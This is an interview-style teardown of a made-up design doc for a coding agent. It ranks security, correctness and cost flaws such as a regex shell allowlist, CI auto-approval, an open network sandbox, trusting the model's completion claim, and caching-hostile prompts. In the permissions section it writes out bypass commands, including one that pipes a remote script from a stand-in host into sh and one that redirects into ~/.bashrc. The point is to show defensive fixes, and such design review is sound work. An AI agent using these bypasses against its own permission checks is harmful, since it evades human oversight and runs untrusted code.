## Question

<Callout kind="interview" label="The prompt">
"This is the design doc for our internal coding agent. Two reviewers approved it last month. Tear it down: what is wrong, how bad is each problem, and what do you fix first with two engineers and one quarter?"
</Callout>

The document below is constructed for this problem. Read it once as a reviewer would, list the flaws you find and rank them, and set the size limit you would enforce on `AGENTS.md`, in lines or bytes, with a reason. Then open the checklist.

### Forge v1: design

**Goal.** One agent for developer laptops and for CI jobs that fix failing tests overnight. It calls a Responses-style model API.

**Request assembly.** Each turn we rebuild the system prompt from a template: base instructions, the current date and time, `git status`, the list of files open in the editor, the active permission mode, then the full `AGENTS.md`. Tools are gathered each turn from the built-in set plus every connected MCP server (`for server in servers.values()`), so tools a server announces mid-session are available immediately. The conversation follows. Rebuilding every turn keeps the model's view of the environment exact.

**State.** We send `previous_response_id`, so each request carries only the new items and payloads stay small.

**Instructions.** `AGENTS.md` is the single source of truth for conventions. It is about 1,000 lines, everyone can edit it, and the rules that matter are marked IMPORTANT. Rule 14: never modify files under `migrations/`.

**Permissions.** Shell commands are checked against an allowlist. We split the command on `;` and `&&` with a regex and allow it if every part starts with `git`, `npm`, `pytest`, `ls` or `cat`. Anything else prompts the user; in CI, where nobody can answer, it is auto-approved so overnight jobs do not stall.

**Sandbox.** The shell tool runs in a container with the repository mounted read-write and the network open so package installs work. MCP tools run in the agent's host process, since they are trusted integrations.

**Tools.** Tool output is returned in full so the model never misses an error. When the model returns several tool calls in one turn, we run them all with `asyncio.gather` to cut latency.

**Context.** At 90% of the context window we ask the model to summarise the whole conversation and replace the history with the summary.

**Completion and budget.** The run ends when the model replies without a tool call; its final message is posted to the pull request as the summary of the change. `max_turns` is 200. Spend is tracked on a dashboard.

## Answer

Rank by what a single bad run can do, then by how often it happens.

**1. Permissions, CI and the sandbox (security).** The regex split sees `;` and `&&` only, so `pytest || curl -s https://example.com/x | sh` is one "part" that starts with `pytest` and runs. Newlines, `$( )`, backticks and redirects (`cat notes > ~/.bashrc`) pass the same way, and prefix matching on `npm` allows `npm publish`. Worse, CI auto-approves everything that would have prompted, so the unattended runs, the ones nobody watches, have the weakest gate. Codex's rules engine shows the shape of the fix: parse the script, split only a linear chain of plain words joined by `&&`, `||`, `;` or `|`, treat anything with redirection, substitution, variables, wildcards or control flow as one `bash -lc` invocation that no narrow allow rule matches, and take the most restrictive decision across parts. Unattended means deny, which is what the Agent SDK's `dontAsk` mode does. The open network turns any bypass into exfiltration, and MCP tools in the host process sit outside the sandbox entirely; Codex's own sandbox covers only its shell tool and leaves MCP servers to enforce their own guardrails, so the same gap exists there and has to be closed per server.

**2. Completion is a claim (correctness).** The final message is the model's summary, posted to the PR as fact. Add a Stop check that runs the tests and, on failure, sends the output back to the agent instead of ending the run, with a cap on consecutive continuations (Claude Code ends the turn after eight in a row). Rule 14 has the same disease: it is a line in a 1,000-line file, so it is advice. Make it a deny rule or a `PreToolUse` hook that exits 2.

**3. Compaction loses the task (correctness).** Summarising the whole conversation at 90% puts the original request and its acceptance criteria at the mercy of one model-written summary. Keep the first messages verbatim, keep the most recent turns, summarise the middle (OpenHands' summarising condenser keeps the first four events by default), and re-read instruction files after compaction.

**4. The prefix changes every turn (cost and latency).** The date, time and `git status` sit at the top of the prompt, so no request shares a prefix with the one before it, and every turn is a full cache miss. Collecting tools from `servers.values()` each turn adds two more ways to miss: ordering that depends on connection order (the bug Codex's early MCP support had) and tool lists that change mid-session. Put static content first, sort the tools, fix the list for the session, and append changes as new messages, which is how Codex reports a new sandbox mode or working directory.

Here is what the prefix costs, with scenario inputs: a 20,000-token prefix, 2,000 new tokens per turn and 50 turns. With a miss on every turn the model processes the sum over turns 1 to 50 of (20,000 + 2,000t), which is 1,000,000 + 2,000 × 1,275 = 3,550,000 uncached input tokens. With a stable prefix it processes about 20,000 + 50 × 2,000 = 120,000 new tokens, and the rest is read from cache at the cached rate, which is below the standard input rate. The ratio, not the price sheet, is what to put in the review.

**5. `AGENTS.md`.** At 1,000 lines with IMPORTANT everywhere, the file crowds out the task and stops guiding; OpenAI's harness team replaced theirs with a map of roughly 100 lines pointing into a `docs/` directory, and Claude Code's memory guide recommends staying under 200 lines. In Codex it would also be cut: at an assumed 60 bytes a line, 1,000 lines is 60,000 bytes against the 32 KiB (32,768-byte) default, so the rules near the bottom never load. Re-reading it every turn means every edit to it is another cache miss. For the limit you were asked to set, anything from about 100 to 200 lines is defensible, provided the file is a map into `docs/` and a CI check fails the build when it grows past the limit. Set in bytes, it has to sit well under 32 KiB so a nested `AGENTS.md` deeper in the tree still fits in Codex's budget. A limit with no check drifts back to 1,000 lines.

**6. Unbounded output and blanket concurrency.** Full tool output floods the window; cap each result and save the rest to a file the agent can search. `asyncio.gather` over every call lets two edits, or an edit and a test run, race. Run read-only calls together and everything else in order, as the Agent SDK does.

**7. `previous_response_id` is a judgement call.** It is acceptable if no customer needs zero data retention and the provider holding conversation state is fine. Codex avoids it for exactly those two reasons and relies on prefix caching to keep the resend cheap.

### The decision: parser first, or sandbox first

With two engineers and a quarter, both permission fixes will not land at once, and both are defensible.

- **Sandbox first.** Close egress except the package mirror, mount only the repository, and allow most commands inside it. Cost: anything that needs the network (a doc fetch, an API smoke test) fails, and MCP servers still need their own scoping because they run outside the container.
- **Parser first.** Replace the regex with a real parser and narrow allow rules. Cost: more commands land in "ask", which in CI now means "deny", so overnight fix rates drop until the allowlist is tuned; and a parser bug is a bypass.

I would ship the sandbox first, because it bounds the damage of every flaw in the permission layer at once, and put the CI deny-by-default change in the same week, since it is a one-line inversion. The written trade: overnight jobs will fail more often for a few weeks, measured as the share of runs ending on a refused command, and the parser follows. The failure mode of this answer is that the sandbox becomes the only control: a permissive allowlist inside a container that later gets a network exception for one team is the original design again.

## Follow-ups

- *Your plan adds a sandbox policy, a CI inversion, a Stop hook and new compaction rules, and the team has two engineers. Which two ship this quarter, and what risk do you accept in writing for the rest?*
- *What would you need to see to keep rebuilding the system prompt each turn?* Runs so short that the cache rarely warms, or a provider without prefix caching; measure turns per run and cache read share before deciding.
- *A senior engineer says MCP servers must move into the sandbox; another says that breaks their OAuth flows. How do you decide without deciding by rank?* Inventory each server's credentials and side effects, and sandbox the ones that can write or reach the network.
- *After the CI inversion, 30% of overnight runs end on a refused command. Do you widen the allowlist, give CI an approver bot, or accept the rate?*

## Common mistakes

- Listing "use caching" without saying which line of the design breaks the prefix.
- Treating the regex allowlist as fine because "it prompts for anything else", without noticing CI auto-approves the prompts.
- Accepting "MCP tools are trusted integrations" as a reason to leave them outside the sandbox.
- Fixing `AGENTS.md` by trimming it while leaving rule 14 as text.
- Flagging `previous_response_id` as wrong in every case; it is a data-retention decision, not a bug.
